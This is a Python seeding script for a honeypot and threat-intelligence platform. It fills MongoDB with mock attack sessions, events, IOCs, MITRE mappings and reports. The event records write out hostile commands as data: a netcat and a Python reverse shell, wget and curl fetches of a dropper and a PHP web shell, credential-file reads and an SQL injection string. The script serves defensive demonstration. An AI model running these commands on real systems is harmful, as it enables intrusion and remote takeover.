"""
Database Seeding Script for Kurukshetra PS06
Adaptive Cyber Deception & Threat Intelligence Platform

Seeds rich, realistic attack scenarios into MongoDB Atlas permanently:
- SSH Decoy Infiltration & Root Reconnaissance (Tor Exit Node)
- Web Application Honeypot & SQL Injection / Web Shell Upload
- FTP Decoy Service Anonymous Login & Data Exfil
- RDP Honeytoken Credential Stuffing
- IoT Mirai Botnet Telnet Probing
"""

import asyncio
import os
from datetime import datetime, timezone, timedelta
from dotenv import load_dotenv
from motor.motor_asyncio import AsyncIOMotorClient

# Load environment
load_dotenv()
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb://127.0.0.1:27017")
DB_NAME = os.getenv("MONGODB_DB_NAME", "threat_intelligence")

now = datetime.now(timezone.utc)
def t(minutes_ago: int):
    return (now - timedelta(minutes=minutes_ago)).isoformat()

# --------------------------------------------------------------------------
# 1. MOCK ATTACK SESSIONS
# --------------------------------------------------------------------------
MOCK_SESSIONS = [
    {
        "session_id": "ATK-SSH-901",
        "source_ip": "185.220.101.5",
        "target_ip": "192.168.1.20",
        "service": "ssh",
        "start_time": t(60),
        "last_seen": t(15),
        "status": "CONTAINED",
        "risk_score": 95,
        "risk_level": "CRITICAL",
        "risk_breakdown": [
            "Brute-force SSH password guessing (+15)",
            "Authentication bypass with decoy honeytoken (+25)",
            "System & OS reconnaissance executed (+20)",
            "Malicious ingress tool download attempted (+20)",
            "Reverse shell interactive payload (+15)"
        ],
        "fingerprint": "SSH-CRED-RECON-DECOY-C3",
        "event_count": 11,
        "containment_info": {
            "status": "CONTAINED",
            "action": "ISOLATE",
            "reason": "Automated high-risk threshold (95/100) exceeded. Reverse shell detected.",
            "timestamp": t(14)
        }
    },
    {
        "session_id": "ATK-WEB-402",
        "source_ip": "45.154.255.89",
        "target_ip": "192.168.1.10",
        "service": "http",
        "start_time": t(45),
        "last_seen": t(5),
        "status": "ACTIVE",
        "risk_score": 90,
        "risk_level": "CRITICAL",
        "risk_breakdown": [
            "Directory fuzzing & sensitive file probes (+20)",
            "Honeytoken passwords.txt accessed (+25)",
            "SQL Injection payload in authentication endpoint (+25)",
            "Web shell dropper download via curl (+20)"
        ],
        "fingerprint": "HTTP-SQLI-DECOY-UPLOAD-F8",
        "event_count": 7,
        "containment_info": None
    },
    {
        "session_id": "ATK-RDP-108",
        "source_ip": "91.240.118.172",
        "target_ip": "192.168.1.15",
        "service": "rdp",
        "start_time": t(120),
        "last_seen": t(80),
        "status": "CONTAINED",
        "risk_score": 75,
        "risk_level": "HIGH",
        "risk_breakdown": [
            "Multiple failed NLA handshakes (+20)",
            "Decoy Administrator credential stuffing (+25)",
            "Lateral movement reconnaissance probe (+30)"
        ],
        "fingerprint": "RDP-BRUTE-HONEYTOKEN-E5",
        "event_count": 5,
        "containment_info": {
            "status": "CONTAINED",
            "action": "BLOCK_IP",
            "reason": "Repeated credential stuffing against RDP gateway.",
            "timestamp": t(78)
        }
    },
    {
        "session_id": "ATK-FTP-205",
        "source_ip": "194.26.29.112",
        "target_ip": "192.168.1.25",
        "service": "ftp",
        "start_time": t(180),
        "last_seen": t(140),
        "status": "CLOSED",
        "risk_score": 60,
        "risk_level": "MEDIUM",
        "risk_breakdown": [
            "Anonymous FTP login on deception port (+20)",
            "Decoy financial backup folder accessed (+20)",
            "Data staging probe (+20)"
        ],
        "fingerprint": "FTP-ANON-EXFIL-A2",
        "event_count": 4,
        "containment_info": None
    },
    {
        "session_id": "ATK-TELNET-301",
        "source_ip": "103.152.220.44",
        "target_ip": "192.168.1.30",
        "service": "telnet",
        "start_time": t(240),
        "last_seen": t(210),
        "status": "CLOSED",
        "risk_score": 35,
        "risk_level": "LOW",
        "risk_breakdown": [
            "Automated botnet dictionary scan (+20)",
            "Default IoT credentials attempted (+15)"
        ],
        "fingerprint": "TELNET-MIRAI-SCAN-B1",
        "event_count": 3,
        "containment_info": None
    },
    {
        "session_id": "ATK-SSH-902",
        "source_ip": "198.51.100.77",
        "target_ip": "192.168.1.20",
        "service": "ssh",
        "start_time": t(30),
        "last_seen": t(2),
        "status": "ACTIVE",
        "risk_score": 80,
        "risk_level": "HIGH",
        "risk_breakdown": [
            "High-speed dictionary credential spray (+30)",
            "Honeytoken user access attempted (+25)",
            "Decoy canary file query (+25)"
        ],
        "fingerprint": "SSH-SPRAY-CRED-D4",
        "event_count": 6,
        "containment_info": None
    }
]

# --------------------------------------------------------------------------
# 2. MOCK EVENTS
# --------------------------------------------------------------------------
MOCK_EVENTS = [
    # --- ATK-SSH-901 Events ---
    {"event_id": "EVT-SSH-001", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(60), "event_type": "login_attempt", "event": "Failed password for root from 185.220.101.5 port 41234", "metadata": {"auth_status": "failed", "username": "root"}},
    {"event_id": "EVT-SSH-002", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(58), "event_type": "login_attempt", "event": "Failed password for admin from 185.220.101.5 port 41238", "metadata": {"auth_status": "failed", "username": "admin"}},
    {"event_id": "EVT-SSH-003", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(55), "event_type": "login_success", "event": "Accepted password for decoy_user from 185.220.101.5 port 41240 (Honeytoken Triggered)", "metadata": {"auth_status": "accepted", "honeytoken": True, "username": "decoy_user"}},
    {"event_id": "EVT-SSH-004", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(53), "event_type": "command", "event": "whoami", "metadata": {"user": "decoy_user"}},
    {"event_id": "EVT-SSH-005", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(51), "event_type": "command", "event": "uname -a", "metadata": {"user": "decoy_user"}},
    {"event_id": "EVT-SSH-006", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(48), "event_type": "command", "event": "cat /etc/passwd", "metadata": {"user": "decoy_user"}},
    {"event_id": "EVT-SSH-007", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(45), "event_type": "command", "event": "cat /root/.env (Honeytoken Canary File)", "metadata": {"canary_file": "/root/.env", "user": "decoy_user"}},
    {"event_id": "EVT-SSH-008", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(40), "event_type": "command", "event": "wget http://cdn.malicious-domain.cc/tools/dropper.sh -O /tmp/dropper.sh", "metadata": {"tool": "wget", "url": "http://cdn.malicious-domain.cc/tools/dropper.sh"}},
    {"event_id": "EVT-SSH-009", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(35), "event_type": "command", "event": "chmod +x /tmp/dropper.sh", "metadata": {"file": "/tmp/dropper.sh"}},
    {"event_id": "EVT-SSH-010", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(30), "event_type": "command", "event": "sudo -l", "metadata": {"priv_esc": True}},
    {"event_id": "EVT-SSH-011", "session_id": "ATK-SSH-901", "source_ip": "185.220.101.5", "target_ip": "192.168.1.20", "service": "ssh", "timestamp": t(20), "event_type": "command", "event": "nc -e /bin/bash 185.220.101.5 9001 (Reverse Shell Spawn)", "metadata": {"c2_ip": "185.220.101.5", "c2_port": 9001, "tool": "nc"}},

    # --- ATK-WEB-402 Events ---
    {"event_id": "EVT-WEB-001", "session_id": "ATK-WEB-402", "source_ip": "45.154.255.89", "target_ip": "192.168.1.10", "service": "http", "timestamp": t(45), "event_type": "web_probe", "event": "GET /robots.txt HTTP/1.1", "metadata": {"path": "/robots.txt", "method": "GET"}},
    {"event_id": "EVT-WEB-002", "session_id": "ATK-WEB-402", "source_ip": "45.154.255.89", "target_ip": "192.168.1.10", "service": "http", "timestamp": t(40), "event_type": "web_probe", "event": "GET /admin/passwords.txt HTTP/1.1 (Decoy Canary Access)", "metadata": {"canary_file": "/admin/passwords.txt", "method": "GET"}},
    {"event_id": "EVT-WEB-003", "session_id": "ATK-WEB-402", "source_ip": "45.154.255.89", "target_ip": "192.168.1.10", "service": "http", "timestamp": t(32), "event_type": "exploit_attempt", "event": "POST /api/login ' OR '1'='1' -- (SQL Injection)", "metadata": {"attack_vector": "SQLi", "payload": "' OR '1'='1' --"}},
    {"event_id": "EVT-WEB-004", "session_id": "ATK-WEB-402", "source_ip": "45.154.255.89", "target_ip": "192.168.1.10", "service": "http", "timestamp": t(25), "event_type": "command", "event": "curl http://45.154.255.89/backdoor.php -o /var/www/html/backdoor.php", "metadata": {"file": "/var/www/html/backdoor.php", "tool": "curl", "url": "http://45.154.255.89/backdoor.php"}},
    {"event_id": "EVT-WEB-005", "session_id": "ATK-WEB-402", "source_ip": "45.154.255.89", "target_ip": "192.168.1.10", "service": "http", "timestamp": t(18), "event_type": "command", "event": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"45.154.255.89\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/bash\")'", "metadata": {"c2_ip": "45.154.255.89", "tool": "python3"}},
    {"event_id": "EVT-WEB-006", "session_id": "ATK-WEB-402", "source_ip": "45.154.255.89", "target_ip": "192.168.1.10", "service": "http", "timestamp": t(10), "event_type": "command", "event": "cat /var/www/html/config.php (Decoy DB credentials)", "metadata": {"honeytoken": True}},
    {"event_id": "EVT-WEB-007", "session_id": "ATK-WEB-402", "source_ip": "45.154.255.89", "target_ip": "192.168.1.10", "service": "http", "timestamp": t(5), "event_type": "command", "event": "nmap -sS -p 22,80,3306,5432 192.168.1.0/24", "metadata": {"tool": "nmap", "scan_type": "syn"}}
]

# --------------------------------------------------------------------------
# 3. MOCK INDICATORS OF COMPROMISE (IOCs)
# --------------------------------------------------------------------------
MOCK_IOCS = [
    {"value": "185.220.101.5", "ioc_type": "ip", "threat_category": "ATTACKER_SOURCE", "confidence": "HIGH", "session_ids": ["ATK-SSH-901"], "source_ips": ["185.220.101.5"], "first_seen": t(60), "last_seen": t(15), "notes": "Known Tor exit node scanning decoy SSH"},
    {"value": "45.154.255.89", "ioc_type": "ip", "threat_category": "ATTACKER_SOURCE", "confidence": "CRITICAL", "session_ids": ["ATK-WEB-402"], "source_ips": ["45.154.255.89"], "first_seen": t(45), "last_seen": t(5), "notes": "Bulletproof VPS hosting automated SQLi exploits"},
    {"value": "91.240.118.172", "ioc_type": "ip", "threat_category": "ATTACKER_SOURCE", "confidence": "HIGH", "session_ids": ["ATK-RDP-108"], "source_ips": ["91.240.118.172"], "first_seen": t(120), "last_seen": t(80), "notes": "RDP Credential brute-force scanner"},
    {"value": "194.26.29.112", "ioc_type": "ip", "threat_category": "ATTACKER_SOURCE", "confidence": "MEDIUM", "session_ids": ["ATK-FTP-205"], "source_ips": ["194.26.29.112"], "first_seen": t(180), "last_seen": t(140), "notes": "Automated FTP dictionary attacker"},
    {"value": "103.152.220.44", "ioc_type": "ip", "threat_category": "ATTACKER_SOURCE", "confidence": "LOW", "session_ids": ["ATK-TELNET-301"], "source_ips": ["103.152.220.44"], "first_seen": t(240), "last_seen": t(210), "notes": "Mirai botnet zombie host"},
    {"value": "198.51.100.77", "ioc_type": "ip", "threat_category": "ATTACKER_SOURCE", "confidence": "HIGH", "session_ids": ["ATK-SSH-902"], "source_ips": ["198.51.100.77"], "first_seen": t(30), "last_seen": t(2), "notes": "High-velocity password sprayer"},
    {"value": "http://cdn.malicious-domain.cc/tools/dropper.sh", "ioc_type": "url", "threat_category": "PAYLOAD_DELIVERY", "confidence": "CRITICAL", "session_ids": ["ATK-SSH-901"], "source_ips": ["185.220.101.5"], "first_seen": t(40), "last_seen": t(40), "notes": "Linux dropper script URL"},
    {"value": "cdn.malicious-domain.cc", "ioc_type": "domain", "threat_category": "MALICIOUS_DOMAIN", "confidence": "CRITICAL", "session_ids": ["ATK-SSH-901"], "source_ips": ["185.220.101.5"], "first_seen": t(40), "last_seen": t(40), "notes": "Payload distribution host"},
    {"value": "http://45.154.255.89/backdoor.php", "ioc_type": "url", "threat_category": "PAYLOAD_DELIVERY", "confidence": "CRITICAL", "session_ids": ["ATK-WEB-402"], "source_ips": ["45.154.255.89"], "first_seen": t(25), "last_seen": t(25), "notes": "PHP Web Shell download staging"},
    {"value": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "ioc_type": "hash_sha256", "threat_category": "MALWARE_HASH", "confidence": "HIGH", "session_ids": ["ATK-SSH-901"], "source_ips": ["185.220.101.5"], "first_seen": t(40), "last_seen": t(40), "notes": "SHA256 signature of dropper.sh payload"},
    {"value": "5d41402abc4b2a76b9719d911017c592", "ioc_type": "hash_md5", "threat_category": "MALWARE_HASH", "confidence": "HIGH", "session_ids": ["ATK-WEB-402"], "source_ips": ["45.154.255.89"], "first_seen": t(25), "last_seen": t(25), "notes": "MD5 hash of backdoor.php web shell"},
    {"value": "curl", "ioc_type": "tool", "threat_category": "OFFENSIVE_TOOL", "confidence": "MEDIUM", "session_ids": ["ATK-WEB-402"], "source_ips": ["45.154.255.89"], "first_seen": t(25), "last_seen": t(25), "notes": "Offensive file download utility"},
    {"value": "wget", "ioc_type": "tool", "threat_category": "OFFENSIVE_TOOL", "confidence": "MEDIUM", "session_ids": ["ATK-SSH-901"], "source_ips": ["185.220.101.5"], "first_seen": t(40), "last_seen": t(40), "notes": "Ingress binary download utility"},
    {"value": "nc", "ioc_type": "tool", "threat_category": "OFFENSIVE_TOOL", "confidence": "CRITICAL", "session_ids": ["ATK-SSH-901"], "source_ips": ["185.220.101.5"], "first_seen": t(20), "last_seen": t(20), "notes": "Netcat reverse shell binary"},
    {"value": "nmap", "ioc_type": "tool", "threat_category": "OFFENSIVE_TOOL", "confidence": "HIGH", "session_ids": ["ATK-WEB-402"], "source_ips": ["45.154.255.89"], "first_seen": t(5), "last_seen": t(5), "notes": "Network exploration and port scanner"},
    {"value": "/etc/passwd", "ioc_type": "file", "threat_category": "SENSITIVE_FILE", "confidence": "HIGH", "session_ids": ["ATK-SSH-901"], "source_ips": ["185.220.101.5"], "first_seen": t(48), "last_seen": t(48), "notes": "Linux user account list"},
    {"value": "/root/.env", "ioc_type": "file", "threat_category": "HONEYTOKEN_CANARY", "confidence": "CRITICAL", "session_ids": ["ATK-SSH-901"], "source_ips": ["185.220.101.5"], "first_seen": t(45), "last_seen": t(45), "notes": "Decoy honeytoken file containing fake AWS credentials"},
    {"value": "/admin/passwords.txt", "ioc_type": "file", "threat_category": "HONEYTOKEN_CANARY", "confidence": "CRITICAL", "session_ids": ["ATK-WEB-402"], "source_ips": ["45.154.255.89"], "first_seen": t(40), "last_seen": t(40), "notes": "Decoy breadcrumb password file accessed"}
]

# --------------------------------------------------------------------------
# 4. MOCK MITRE MAPPINGS
# --------------------------------------------------------------------------
MOCK_MITRE = [
    {"session_id": "ATK-SSH-901", "technique_id": "T1110.001", "technique_name": "Password Guessing", "tactic": "Credential Access", "evidence": "Failed password for root/admin repeatedly", "timestamp": t(58)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1078", "technique_name": "Valid Accounts", "tactic": "Initial Access", "evidence": "Accepted password for decoy_user", "timestamp": t(55)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1033", "technique_name": "System Owner/User Discovery", "tactic": "Discovery", "evidence": "whoami", "timestamp": t(53)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1082", "technique_name": "System Information Discovery", "tactic": "Discovery", "evidence": "uname -a", "timestamp": t(51)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1087.001", "technique_name": "Local Accounts", "tactic": "Discovery", "evidence": "cat /etc/passwd", "timestamp": t(48)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1552.001", "technique_name": "Credentials in Files", "tactic": "Credential Access", "evidence": "cat /root/.env", "timestamp": t(45)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1105", "technique_name": "Ingress Tool Transfer", "tactic": "Command and Control", "evidence": "wget http://cdn.malicious-domain.cc/tools/dropper.sh", "timestamp": t(40)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1222.002", "technique_name": "Linux Permissions Modification", "tactic": "Defense Evasion", "evidence": "chmod +x /tmp/dropper.sh", "timestamp": t(35)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1548.003", "technique_name": "Sudo and Sudo Caching", "tactic": "Privilege Escalation", "evidence": "sudo -l", "timestamp": t(30)},
    {"session_id": "ATK-SSH-901", "technique_id": "T1059.004", "technique_name": "Unix Shell", "tactic": "Execution", "evidence": "nc -e /bin/bash 185.220.101.5 9001", "timestamp": t(20)},

    {"session_id": "ATK-WEB-402", "technique_id": "T1190", "technique_name": "Exploit Public-Facing Application", "tactic": "Initial Access", "evidence": "POST /api/login ' OR '1'='1' --", "timestamp": t(32)},
    {"session_id": "ATK-WEB-402", "technique_id": "T1552.001", "technique_name": "Credentials in Files", "tactic": "Credential Access", "evidence": "GET /admin/passwords.txt", "timestamp": t(40)},
    {"session_id": "ATK-WEB-402", "technique_id": "T1105", "technique_name": "Ingress Tool Transfer", "tactic": "Command and Control", "evidence": "curl http://45.154.255.89/backdoor.php", "timestamp": t(25)},
    {"session_id": "ATK-WEB-402", "technique_id": "T1046", "technique_name": "Network Service Discovery", "tactic": "Discovery", "evidence": "nmap -sS 192.168.1.0/24", "timestamp": t(5)}
]

# --------------------------------------------------------------------------
# 5. MOCK ATTACKER PROFILES
# --------------------------------------------------------------------------
MOCK_ATTACKERS = [
    {
        "attacker_id": "ACTOR-TOR-SSH-01",
        "source_ips": ["185.220.101.5"],
        "session_ids": ["ATK-SSH-901"],
        "total_events": 11,
        "first_seen": t(180),
        "last_seen": t(15),
        "max_risk_score": 95,
        "fingerprints": ["SSH-CRED-RECON-DECOY-C3", "SSH-RECON-01"],
        "primary_tactics": ["Credential Access", "Discovery", "Execution", "Command and Control"],
        "associated_services": ["ssh"],
        "known_actor_notes": "Suspected automated reconnaissance bot scanning via Tor relay"
    },
    {
        "attacker_id": "ACTOR-VPS-WEB-02",
        "source_ips": ["45.154.255.89"],
        "session_ids": ["ATK-WEB-402"],
        "total_events": 7,
        "first_seen": t(90),
        "last_seen": t(5),
        "max_risk_score": 90,
        "fingerprints": ["HTTP-SQLI-DECOY-UPLOAD-F8"],
        "primary_tactics": ["Initial Access", "Credential Access", "Command and Control", "Discovery"],
        "associated_services": ["http"],
        "known_actor_notes": "Bulletproof VPS actor targeting web authentication endpoints with SQLi"
    },
    {
        "attacker_id": "ACTOR-RDP-BRUTE-03",
        "source_ips": ["91.240.118.172"],
        "session_ids": ["ATK-RDP-108"],
        "total_events": 5,
        "first_seen": t(300),
        "last_seen": t(80),
        "max_risk_score": 75,
        "fingerprints": ["RDP-BRUTE-HONEYTOKEN-E5"],
        "primary_tactics": ["Credential Access", "Lateral Movement"],
        "associated_services": ["rdp"],
        "known_actor_notes": "RDP credential brute force operator from high-risk ASN"
    }
]

# --------------------------------------------------------------------------
# 6. MOCK THREAT REPORTS
# --------------------------------------------------------------------------
MOCK_REPORTS = [
    {
        "report_id": "RPT-ATK-SSH-901",
        "session_id": "ATK-SSH-901",
        "generated_at": now.isoformat(),
        "source_ip": "185.220.101.5",
        "target_ip": "192.168.1.20",
        "service": "ssh",
        "executive_summary": "High-severity intrusion detected on SSH Honeypot. Adversary from 185.220.101.5 bypassed initial decoy authentication, triggered canary honeytoken '/root/.env', transferred ingress dropper script, and attempted an interactive reverse shell before automated isolation.",
        "containment_status": {
            "status": "CONTAINED",
            "action": "ISOLATE",
            "reason": "Automated high-risk threshold (95/100) exceeded.",
            "timestamp": t(14)
        },
        "attacker_fingerprint": "SSH-CRED-RECON-DECOY-C3",
        "risk": {
            "score": 95,
            "level": "CRITICAL",
            "breakdown": [
                "Brute-force SSH password guessing (+15)",
                "Authentication bypass with decoy honeytoken (+25)",
                "System & OS reconnaissance executed (+20)",
                "Malicious ingress tool download attempted (+20)",
                "Reverse shell interactive payload (+15)"
            ]
        },
        "mitre_mapping": [m for m in MOCK_MITRE if m["session_id"] == "ATK-SSH-901"],
        "iocs": [i for i in MOCK_IOCS if "ATK-SSH-901" in i.get("session_ids", [])],
        "timeline": [e for e in MOCK_EVENTS if e["session_id"] == "ATK-SSH-901"],
        "ai_analysis": {
            "summary": "Sophisticated automated or semi-automated intruder operating via Tor exit node. Demonstrated multi-stage attack lifecycle from credential brute-forcing to post-exploitation shell spawning.",
            "likely_objective": "Establish persistent C2 footprint, privilege escalation, and lateral movement into production enterprise infrastructure.",
            "risk_explanation": "Critical threat profile verified through the simultaneous execution of OS reconnaissance, ingress payload retrieval, and reverse shell instantiation.",
            "observed_behavior_explanation": "Attacker systematically probed user accounts, accessed deployed canary honeytokens, retrieved remote payloads using wget, and initiated a bash reverse shell via netcat.",
            "recommended_defensive_action": "1. Block source IP 185.220.101.5 at perimeter firewall. 2. Blacklist domain cdn.malicious-domain.cc at corporate DNS resolver. 3. Monitor production logs for any queries matching decoy AWS keys from /root/.env."
        }
    },
    {
        "report_id": "RPT-ATK-WEB-402",
        "session_id": "ATK-WEB-402",
        "generated_at": now.isoformat(),
        "source_ip": "45.154.255.89",
        "target_ip": "192.168.1.10",
        "service": "http",
        "executive_summary": "Critical web attack campaign identified against HTTP decoy interface. Attacker executed classic SQL injection bypass, downloaded a PHP backdoor web shell, and conducted internal CIDR port sweeps.",
        "containment_status": {
            "status": "ACTIVE"
        },
        "attacker_fingerprint": "HTTP-SQLI-DECOY-UPLOAD-F8",
        "risk": {
            "score": 90,
            "level": "CRITICAL",
            "breakdown": [
                "Directory fuzzing & sensitive file probes (+20)",
                "Honeytoken passwords.txt accessed (+25)",
                "SQL Injection payload in authentication endpoint (+25)",
                "Web shell dropper download via curl (+20)"
            ]
        },
        "mitre_mapping": [m for m in MOCK_MITRE if m["session_id"] == "ATK-WEB-402"],
        "iocs": [i for i in MOCK_IOCS if "ATK-WEB-402" in i.get("session_ids", [])],
        "timeline": [e for e in MOCK_EVENTS if e["session_id"] == "ATK-WEB-402"],
        "ai_analysis": {
            "summary": "Web exploitation campaign targeting web application vulnerability vectors followed by web shell staging.",
            "likely_objective": "Arbitrary code execution on web tier and internal pivot via network port scanning.",
            "risk_explanation": "High volume of actionable indicators including web shell upload, SQL injection strings, and lateral subnet exploration.",
            "observed_behavior_explanation": "Probed robots.txt, grabbed canary credentials, injected tautological SQL strings, and used curl to fetch backdoor.php.",
            "recommended_defensive_action": "Deploy WAF rule blocking SQLi signature `' OR '1'='1'`, isolate honeypot container, and sinkhole 45.154.255.89."
        }
    }
]


async def seed():
    print(f"Connecting to MongoDB: {DB_NAME}...")
    client = AsyncIOMotorClient(MONGODB_URI)
    db = client[DB_NAME]

    print("Cleaning existing mock collections...")
    await db.attack_sessions.delete_many({})
    await db.events.delete_many({})
    await db.iocs.delete_many({})
    await db.mitre_mappings.delete_many({})
    await db.attackers.delete_many({})
    await db.threat_reports.delete_many({})

    print(f"Inserting {len(MOCK_SESSIONS)} Attack Sessions...")
    await db.attack_sessions.insert_many(MOCK_SESSIONS)

    print(f"Inserting {len(MOCK_EVENTS)} Honeypot Events...")
    await db.events.insert_many(MOCK_EVENTS)

    print(f"Inserting {len(MOCK_IOCS)} Indicators of Compromise (IOCs)...")
    await db.iocs.insert_many(MOCK_IOCS)

    print(f"Inserting {len(MOCK_MITRE)} MITRE ATT&CK Mappings...")
    await db.mitre_mappings.insert_many(MOCK_MITRE)

    print(f"Inserting {len(MOCK_ATTACKERS)} Attacker Profiles...")
    await db.attackers.insert_many(MOCK_ATTACKERS)

    print(f"Inserting {len(MOCK_REPORTS)} Threat Intelligence Reports...")
    await db.threat_reports.insert_many(MOCK_REPORTS)

    print("\n=======================================================")
    print("Database permanently seeded successfully with:")
    print(f"  - Sessions:   {await db.attack_sessions.count_documents({})}")
    print(f"  - Events:     {await db.events.count_documents({})}")
    print(f"  - IOCs:       {await db.iocs.count_documents({})}")
    print(f"  - MITRE:      {await db.mitre_mappings.count_documents({})}")
    print(f"  - Attackers:  {await db.attackers.count_documents({})}")
    print(f"  - Reports:    {await db.threat_reports.count_documents({})}")
    print("=======================================================")

if __name__ == "__main__":
    asyncio.run(seed())
